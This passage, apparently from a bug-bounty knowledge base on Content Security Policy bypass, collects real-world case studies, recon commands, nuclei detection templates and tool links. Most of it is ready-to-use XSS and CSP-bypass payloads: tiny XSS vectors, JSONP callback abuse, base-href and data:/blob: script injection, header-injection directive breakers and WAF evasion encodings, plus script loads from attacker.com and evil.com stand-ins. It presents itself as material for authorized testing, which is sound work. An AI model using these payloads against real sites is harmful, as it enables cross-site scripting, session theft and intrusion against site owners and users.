%0d%0aContent-Security-Policy: script-src 'unsafe-inline'
```

---

## Real World Case Studies

### Case Study 1: PayPal Policy Injection ($900)

**Researcher**: Gareth Heyes (PortSwigger)

PayPal reflected a `token` parameter into the `report-uri` directive:

```http
Content-Security-Policy: ...; report-uri /webapps/xoonboarding/api/log/csp?token=SOMETOKEN
```

**Chrome bypass**: Inject `; script-src-elem 'unsafe-inline'` to override `script-src`.

**Edge bypass**: Inject `; _` — Edge drops the entire policy on invalid syntax.

### Case Study 2: PortSwigger Nonce Bypass

**Researcher**: Gareth Heyes / Alex Borshik

PortSwigger's own site used nonce-based CSP but had a reCAPTCHA gadget:

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value;
```

Attacker injected:
```html
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />
```

The script loaded with the page's nonce, bypassing CSP.

**Lesson**: Nonce-based CSP requires high confidence that JavaScript doesn't contain DOM-reading gadgets.

### Case Study 3: Gmail DOM Clobbering

**Researcher**: Michał Bentkowski

Used DOM Clobbering to exploit Gmail six years after the technique was introduced. Demonstrated that even mature applications can have clobberable code paths.

### Case Study 4: AngularJS Sandbox Escape History

Multiple researchers bypassed AngularJS sandbox across versions:
- Mario Heiderich (Cure53)
- Jan Horn (Google)
- Gareth Heyes (PortSwigger)
- Mathias Karlsson
- Ian Hickey

Google eventually removed the sandbox in Angular 1.6+, acknowledging it was not a security boundary.

---

## Fuzzing Payloads

### CSP Header Fuzzing

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'
Content-Security-Policy: default-src 'none'; script-src 'self' https:;
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
Content-Security-Policy: script-src 'nonce-test' 'strict-dynamic'
```

### Injection Fuzzing

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

### Directive Breakers

```
; script-src 'unsafe-inline'
; script-src-elem 'unsafe-inline'
; default-src *
; _
```

### Tiny XSS Payloads (terjanq)

```html
<base/href=//Ǌ.₨>
<svg/onload=eval(name)>
<svg/onload=eval(`'`+URL)>
<audio/src/onerror=eval(name)>
<img/src/onerror=eval(`'`+URL)>
<script/src=//Ǌ.₨></script>
<iframe/onload=src=top.name>
<style/onload=eval(name)>
<svg/onload=import(/\Ǌ.₨/)>
```

---

## Automation Workflows

### CSP Analyzer Workflow

1. **Extract CSP headers** from all responses
2. **Parse directives** and identify weak configurations
3. **Check for**:
   - `'unsafe-inline'`
   - `'unsafe-eval'`
   - Missing `object-src`, `base-uri`
   - `data:`, `blob:` in script-src
   - Overly broad domains (*.google.com, CDNs)
   - Short nonces or static nonces
   - `strict-dynamic` presence

### Endpoint Discovery

```bash
# Find JSONP endpoints
cat endpoints.txt | grep -E "(callback|jsonp|cb)="

# Find script sources
grep -oP 'src="[^"]+"' page.html | sort -u
```

### Gadget Scanner

1. Identify all `document.querySelector` / `getElementById` calls in JS
2. Check if they use prefix selectors (`^=`, `*=`)
3. Check if results are used for `script.src`, `innerHTML`, `eval`
4. Check for prototype pollution sinks (`_.merge`, `$.extend`, etc.)

### Dynamic Analysis

Use Burp Scanner or custom Chrome extension to:
1. Inject DOM elements with clobbering IDs
2. Monitor if global properties change
3. Check if changed properties reach script sinks

---

## Recon Methodology

### Step 1: CSP Extraction

```bash
# Extract CSP from target
curl -I https://target.com | grep -i content-security-policy

# Check report-only header
curl -I https://target.com | grep -i content-security-policy-report-only

# Extract from meta tags
curl -s https://target.com | grep -i "http-equiv="Content-Security-Policy""
```

### Step 2: Policy Analysis

- Identify all whitelisted domains
- Check for missing directives
- Identify nonce/hash usage
- Check for `strict-dynamic`
- Note `report-uri` / `report-to` endpoints

### Step 3: Domain Recon

For each whitelisted domain:
- Check for JSONP endpoints
- Check for open redirects
- Check for file upload features
- Check for subdomain takeover
- Check for CSP policy injection points

### Step 4: JavaScript Analysis

- Download and analyze all scripts
- Search for dangerous patterns:
  - `eval(`, `Function(`, `setTimeout(`, `setInterval(` with string args
  - `innerHTML`, `outerHTML`, `document.write`
  - `querySelector` with prefix matches
  - `postMessage` without origin checks
  - `$.getScript`, `$.ajax` with user-controlled URLs
  - `Object.assign`, `_.merge` with user input

### Step 5: Gadget Testing

- Test DOM Clobbering on all prefix selectors
- Test prototype pollution on query parameters
- Test Angular/Vue expressions if frameworks are present

---

## Nuclei Templates

### CSP Misconfiguration Detection

```yaml
id: csp-misconfiguration

info:
  name: CSP Misconfiguration
  author: pdteam
  severity: info

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)content-security-policy"
    extractors:
      - type: regex
        part: header
        regex:
          - "(?i)content-security-policy.+"
```

### Unsafe Inline Detection

```yaml
id: csp-unsafe-inline

info:
  name: CSP with unsafe-inline
  author: researcher
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)script-src[^;]*'unsafe-inline'"
          - "(?i)style-src[^;]*'unsafe-inline'"
```

### Missing base-uri Detection

```yaml
id: csp-missing-base-uri

info:
  name: CSP Missing base-uri
  author: researcher
  severity: low

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: regex
        part: header
        negative: true
        regex:
          - "(?i)base-uri"
```

### JSONP Endpoint Detection

```yaml
id: jsonp-endpoint

info:
  name: JSONP Endpoint
  author: researcher
  severity: info

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/data?callback=test"
    matchers:
      - type: word
        words:
          - "test("
```

---

## Tools and Scanners

### CSP Evaluator (Google)

- **URL**: https://csp-evaluator.withgoogle.com/
- **GitHub**: https://github.com/google/csp-evaluator
- **Purpose**: Analyze CSP headers for bypasses and weaknesses

### DOM Invader (PortSwigger)

- **GitHub**: https://github.com/PortSwigger/dom-invader
- **Purpose**: Burp Suite extension for finding DOM-based vulnerabilities including clobbering and prototype pollution

### Nuclei

- **GitHub**: https://github.com/projectdiscovery/nuclei
- **Purpose**: Fast vulnerability scanner with CSP templates

### httpx

- **GitHub**: https://github.com/projectdiscovery/httpx
- **Purpose**: Fast HTTP prober for extracting headers including CSP

### katana

- **GitHub**: https://github.com/projectdiscovery/katana
- **Purpose**: Web crawler for discovering endpoints and script sources

### subfinder

- **GitHub**: https://github.com/projectdiscovery/subfinder
- **Purpose**: Subdomain discovery for checking subdomain takeover on whitelisted domains

### interactsh

- **GitHub**: https://github.com/projectdiscovery/interactsh
- **Purpose**: Out-of-band interaction server for blind testing

### cariddi

- **GitHub**: https://github.com/edoardottt/cariddi
- **Purpose**: Crawler for finding endpoints, secrets, and CSP bypass vectors

### pp-finder

- **GitHub**: https://github.com/yeswehack/pp-finder
- **Purpose**: Prototype pollution finder

### postMessage-tracker

- **GitHub**: https://github.com/fransr/postMessage-tracker
- **Purpose**: Chrome extension for tracking postMessage usage

### CursedChrome

- **GitHub**: https://github.com/mandatoryprogrammer/CursedChrome
- **Purpose**: Chrome extension for demonstrating malicious extensions (related to CSP bypass via extensions)

---

## Advanced Research

### CSP Is Dead, Long Live CSP (Google Research)

Research paper demonstrating that allowlist-based CSPs are fundamentally insecure due to:
- CDN abuse
- JSONP endpoints
- Open redirects
- Hosting of AngularJS and other frameworks on trusted domains

**Recommendation**: Use strict nonce-based or hash-based CSP with `strict-dynamic` if needed.

### Hunting Nonce-Based CSP Bypasses with Dynamic Analysis

PortSwigger research showing that dynamic analysis (taint tracking) can identify:
- Sources: user-controllable DOM properties
- Sinks: script creation, eval, innerHTML
- Gadgets: paths from source to sink that bypass nonce protection

### DOM Clobbering Strikes Back

PortSwigger research expanding DOM clobbering:
- Multi-level clobbering via iframes
- URL property clobbering (username/password)
- Protocol abuse for unencoded values
- Chrome `RadioNodeList` clobbering

### Bypassing CSP with Policy Injection

PayPal case study showing:
- `report-uri` parameter reflection
- `script-src-elem` override in Chrome
- Edge policy dropping on invalid syntax

---

## Bug Bounty Writeups

### PayPal CSP Bypass ($900)
- **Researcher**: Gareth Heyes
- **Technique**: Policy injection via `report-uri` token parameter
- **Impact**: Full CSP bypass on Chrome and Edge

### PortSwigger Self-XSS (Recaptcha Gadget)
- **Researcher**: Alex Borshik / Gareth Heyes
- **Technique**: DOM Clobbering + nonce bypass
- **Impact**: Script loading under nonce-based CSP

### Gmail DOM Clobbering
- **Researcher**: Michał Bentkowski
- **Technique**: Advanced DOM clobbering
- **Impact**: Client-side code execution

### Various AngularJS CSTI Reports
- Multiple researchers
- **Impact**: XSS on sites with strict CSP but whitelisted AngularJS CDN

---

## Payload Collections

### Tiny XSS Payloads (terjanq)

```html
<base/href=//Ǌ.₨>
<svg/onload=eval(name)>
<svg/onload=eval(`'`+URL)>
<audio/src/onerror=eval(name)>
<img/src/onerror=eval(`'`+URL)>
<script/src=//Ǌ.₨></script>
<iframe/onload=src=top.name>
<style/onload=eval(name)>
<svg/onload=import(/\Ǌ.₨/)>
<style/onload=import(/\Ǌ.₨/)>
<iframe/onload=import(/\Ǌ.₨/)>
```

### CSP Bypass Payloads (PayloadsAllTheThings)

```html
<!-- unsafe-inline -->
<script>alert(1)</script>

<!-- AngularJS -->
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>

<!-- base-uri abuse -->
<base href="https://attacker.com/">

<!-- data: URI -->
<script src="data:text/javascript,alert(1)"></script>

<!-- blob: URI -->
<script>var b=new Blob(['alert(1)'],{type:'text/javascript'});var u=URL.createObjectURL(b);var s=document.createElement('script');s.src=u;document.body.appendChild(s);</script>

<!-- iframe srcdoc -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>

<!-- object -->
<object data="data:text/html,<script>alert(1)</script>"></object>

<!-- embed -->
<embed src="data:text/html,<script>alert(1)</script>"></embed>
```

### JSONP Callback Payloads

```html
<script src="https://target.com/api?callback=alert(1)"></script>
<script src="https://target.com/api?callback=eval&param=alert(1)"></script>
<script src="https://target.com/api?callback=Function&param=alert(1)"></script>
<script src="https://target.com/api?callback=setTimeout&param=alert(1),100"></script>
<script src="https://target.com/api?callback=location.assign&param=javascript:alert(1)"></script>
```

---

## WAF Bypasses

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<svg OnLoAd=alert(1)>
```

### Encoding

```html
<script src="data:text/javascript,%61%6c%65%72%74%28%31%29"></script>
<svg onload="eval(atob('YWxlcnQoMSk='))">
```

### Comment Injection

```html
<script>/*WAF*/alert/*WAF*/(1)</script>
```

### Concatenation

```html
<script>alert/*foo*/(1)</script>
<script>'alert'+(1)</script>
```

### Template Literal Abuse

```html
<script>eval(`al`+`ert(1)`)</script>
```

### HTML Entities

```html
<svg onload="alert&#40;1&#41;">
```

---

## Detection Techniques

### Manual Testing

1. **Check CSP Header**:
   ```bash
   curl -I https://target.com | grep -i content-security-policy
   ```

2. **Test Inline Execution**:
   ```html
   <script>console.log('CSP test')</script>
   ```
   Check browser console for violation reports.

3. **Test Eval**:
   ```javascript
   eval('1+1')
   ```

4. **Test External Script**:
   ```html
   <script src="https://evil.com/test.js"></script>
   ```

5. **Test data: URI**:
   ```html
   <script src="data:text/javascript,alert(1)"></script>
   ```

### Automated Detection

- Use CSP Evaluator to score the policy
- Use DOM Invader to find gadgets
- Use Burp Scanner to detect AngularJS CSTI
- Use nuclei templates for common misconfigurations

### Violation Reporting

If `report-uri` or `report-to` is set, trigger violations to map the policy:

```javascript
// Trigger script-src violation
var s = document.createElement('script');
s.src = 'https://unique-id.attacker.com/';
document.body.appendChild(s);
```

Monitor your server for the report which contains the full policy.

---

## References

### PortSwigger Research
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- https://portswigger.net/research/bypassing-csp-with-policy-injection
- https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
- https://portswigger.net/research/csp-bypass-techniques
- https://portswigger.net/research/dom-clobbering-strikes-back
- https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
- https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csti-vulnerability
- https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags

### GitHub Repositories
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSP%20Bypass
- https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
- https://github.com/terjanq/Tiny-XSS-Payloads
- https://github.com/0xspade/bugbounty/tree/master/csp
- https://github.com/payloadbox/xss-payload-list
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/PortSwigger/dom-invader
- https://github.com/GoogleChromeLabs/csp-evaluator
- https://github.com/google/csp-evaluator
- https://github.com/w3c/webappsec-csp
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/csp
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/httpx
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/interactsh
- https://github.com/projectdiscovery/notify
- https://github.com/projectdiscovery/uncover
- https://github.com/edoardottt/cariddi
- https://github.com/defparam/smuggler
- https://github.com/mandatoryprogrammer/CursedChrome
- https://github.com/yeswehack/pp-finder
- https://github.com/fransr/postMessage-tracker
- https://github.com/PortSwigger/template-injection-workshop
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
- https://github.com/lutfumertceylan/top25-parameter
- https://github.com/projectdiscovery/dnsx
- https://github.com/projectdiscovery/naabu
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/asnmap
- https://github.com/projectdiscovery/cdncheck
- https://github.com/projectdiscovery/tlsx
- https://github.com/projectdiscovery/alterx

### Documentation
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri

### Research Articles
- https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- https://infosecwriteups.com/content-security-policy-csp-bypass-techniques-7d4ce7f2b5c2
- https://medium.com/@filedescriptor/csp-bypass-techniques-and-real-world-exploitation-3d2d1d3d54f2
- https://csp-evaluator.withgoogle.com/

### Google Research
- "CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"
- "Mitigate cross-site scripting with a strict Content Security Policy" (web.dev)

---

> **Disclaimer**: This knowledgebase is for authorized security testing and bug bounty hunting only. Always ensure you have permission before testing any target.
